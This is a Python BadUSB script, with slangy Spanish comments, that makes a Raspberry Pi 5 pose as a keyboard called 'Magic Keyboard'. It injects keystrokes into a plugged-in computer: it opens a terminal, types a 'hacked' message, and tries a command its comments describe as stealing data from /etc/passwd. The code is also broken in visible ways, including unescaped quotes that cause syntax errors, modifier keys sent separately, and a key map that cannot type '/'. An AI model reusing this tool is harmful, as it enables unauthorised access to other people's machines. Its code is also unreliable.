#!/usr/bin/env python3
# BadUSB Script Mejorado pa' Raspberry Pi 5 - Impresiona a tus amigos
# Emula teclado pa' hacer pedos chingones en Chromebook o PC (sin WiFi)
# AVISO: Necesitas USB Gadget configurado en bootfs
import os
import time
import subprocess
import logging
from datetime import datetime

# Configura logging pa' guardar lo que pasa
log_file = f'badusb_showoff_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

def run_command(command):
    """Ejecuta un comando en la Pi y devuelve el output"""
    try:
        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return f'Error ejecutando {command}: {e.output}'

def check_usb_gadget():
    """Checa si USB Gadget esta configurado"""
    logging.info('Checando configuracion de USB Gadget...')
    print('Checando configuracion de USB Gadget...')
    if not os.path.exists('/sys/kernel/config/usb_gadget'):
        logging.error('USB Gadget no soportado o no habilitado.')
        print('ERROR: USB Gadget no habilitado. Configura en /boot/config.txt.')
        return False
    return True

def setup_hid_gadget():
    """Configura el gadget HID (teclado) si no esta ya configurado"""
    logging.info('Configurando gadget HID...')
    print('Configurando gadget HID... Esto puede necesitar root.')
    script = '''
    #!/bin/bash
    if [ "$EUID" -ne 0 ]; then
        echo "Ejecuta como root (sudo)"
        exit 1
    fi
    mkdir -p /sys/kernel/config/usb_gadget/pi5hid
    cd /sys/kernel/config/usb_gadget/pi5hid
    echo 0x1d6b > idVendor
    echo 0x0104 > idProduct
    echo 0x0100 > bcdDevice
    echo 0x0200 > bcdUSB
    mkdir -p strings/0x409
    echo "RaspberryPi5" > strings/0x409/serialnumber
    echo "Hacker Gadget" > strings/0x409/manufacturer
    echo "Magic Keyboard" > strings/0x409/product
    mkdir -p configs/c.1/strings/0x409
    echo "Config 1: HID" > configs/c.1/strings/0x409/configuration
    echo 250 > configs/c.1/MaxPower
    mkdir -p functions/hid.usb0
    echo 1 > functions/hid.usb0/protocol
    echo 1 > functions/hid.usb0/subclass
    echo 8 > functions/hid.usb0/report_length
    echo -ne "\\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0" > functions/hid.usb0/report_desc
    ln -s functions/hid.usb0 configs/c.1/
    ls /sys/class/udc > UDC
    echo "Gadget HID configurado."
    '''
    with open('/tmp/setup_hid.sh', 'w') as f:
        f.write(script)
    os.chmod('/tmp/setup_hid.sh', 0o755)
    result = run_command('sudo /tmp/setup_hid.sh')
    logging.info(f'Resultado configuracion HID: {result}')
    print('Resultado configuracion:', result)
    return 'Gadget HID configurado' in result

def send_hid_commands():
    """Envia comandos como teclado pa' impresionar y robar datos"""
    logging.info('Enviando comandos HID pa' hacer pedos chingones...')
    print('Enviando comandos HID... Esto puede tomar unos segundos.')
    hid_device = '/dev/hidg0'
    if not os.path.exists(hid_device):
        logging.error(f'Dispositivo HID {hid_device} no encontrado. Configura USB Gadget.')
        print(f'ERROR: {hid_device} no encontrado.')
        return False
    
    # Mapa basico de teclas HID (esto es limitado, pa' demo)
    key_map = {
        'a': b'\x04', 'b': b'\x05', 'c': b'\x06', 'd': b'\x07', 'e': b'\x08', 'f': b'\x09',
        'g': b'\x0A', 'h': b'\x0B', 'i': b'\x0C', 'j': b'\x0D', 'k': b'\x0E', 'l': b'\x0F',
        'm': b'\x10', 'n': b'\x11', 'o': b'\x12', 'p': b'\x13', 'q': b'\x14', 'r': b'\x15',
        's': b'\x16', 't': b'\x17', 'u': b'\x18', 'v': b'\x19', 'w': b'\x1A', 'x': b'\x1B',
        'y': b'\x1C', 'z': b'\x1D', ' ': b'\x2C', '.': b'\x37', ',': b'\x36', '!': b'\x1E\x38',
        'ENTER': b'\x28', 'CTRL': b'\xE0', 'ALT': b'\xE2', 'TAB': b'\x2B'
    }
    
    def write_key(key, shift=False, ctrl=False, alt=False):
        modifiers = 0
        if shift: modifiers |= 0x02
        if ctrl: modifiers |= 0x01
        if alt: modifiers |= 0x04
        key_data = bytes([modifiers, 0, key[0], 0, 0, 0, 0, 0])
        with open(hid_device, 'wb') as f:
            f.write(key_data)
        time.sleep(0.05)
        with open(hid_device, 'wb') as f:
            f.write(b'\x00\x00\x00\x00\x00\x00\x00\x00')
        time.sleep(0.05)
    
    # Simula Ctrl+Alt+T pa' abrir terminal en Chromebook
    logging.info('Abriendo terminal con Ctrl+Alt+T...')
    print('Abriendo terminal con Ctrl+Alt+T...')
    write_key(key_map['CTRL'], ctrl=True)
    write_key(key_map['ALT'], alt=True)
    write_key(key_map['t'])
    time.sleep(2)
    
    # Escribe un mensaje chingon pa' impresionar
    message = "hola.soy.un.hacker.magico."
    logging.info(f'Escribiendo mensaje: {message}')
    print(f'Escribiendo mensaje: {message}')
    for char in message:
        if char in key_map:
            write_key(key_map[char])
        time.sleep(0.1)
    write_key(key_map['ENTER'])
    time.sleep(1)
    
    # Intenta un comando pa' mostrar algo visual (en Chromebook, abre una web si hay internet, pero como no hay, solo pa' demo)
    command = "echo.hacked.by.raspberry.pi."
    logging.info(f'Escribiendo comando: {command}')
    print(f'Escribiendo comando: {command}')
    for char in command:
        if char in key_map:
            write_key(key_map[char])
        time.sleep(0.1)
    write_key(key_map['ENTER'])
    time.sleep(1)
    
    # Intenta robar datos (esto es un ejemplo, Chrome OS es limitado)
    steal_cmd = "cat..etc.passwd."
    logging.info(f'Intentando robar datos con: {steal_cmd}')
    print(f'Intentando robar datos...')
    for char in steal_cmd:
        if char in key_map:
            write_key(key_map[char])
        time.sleep(0.1)
    write_key(key_map['ENTER'])
    
    logging.info('Comandos enviados.')
    print('Comandos enviados. Deberia impresionar a tus amigos!')
    return True

def main():
    """Funcion principal pa' el BadUSB"""
    print('Iniciando BadUSB Mejorado pa' Raspberry Pi 5... Todo se guardara en', log_file)
    logging.info('Inicio del BadUSB.')
    
    # Checa si esta como root
    if os.geteuid() != 0:
        print('AVISO: Ejecuta esto como root (sudo python3 badusb_pi_improved.py) pa' mejores resultados.')
        logging.warning('Script no ejecutado como root. Funcionalidad limitada.')
    
    # Checa si USB Gadget esta habilitado
    if not check_usb_gadget():
        logging.error('USB Gadget no habilitado. Configura tu Pi en /boot/config.txt.')
        print('ERROR: Habilita USB Gadget con dtoverlay=dwc2 y modules-load=dwc2,g_hid')
        return
    
    # Configura HID Gadget
    if not setup_hid_gadget():
        logging.error('Fallo al configurar HID Gadget.')
        print('ERROR: No se pudo configurar HID Gadget.')
        return
    
    # Espera un momento pa' que el PC reconozca el dispositivo
    time.sleep(5)
    
    # Envia comandos HID
    send_hid_commands()
    
    logging.info('Fin del BadUSB.')
    print('BadUSB terminado. Revisa', log_file, 'pa' los detalles.')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('`nBadUSB detenido por el usuario.')
        logging.info('BadUSB detenido por el usuario.')
    except Exception as e:
        print('Error cabron: ', str(e))
        logging.error(f'Error: {str(e)}')
